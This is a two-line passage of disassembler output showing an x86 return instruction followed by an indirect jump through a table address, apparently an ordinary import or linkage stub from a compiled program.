  417aed:	c3                   	ret
  417aee:	ff 25 50 80 41 00    	jmp    *0x418050
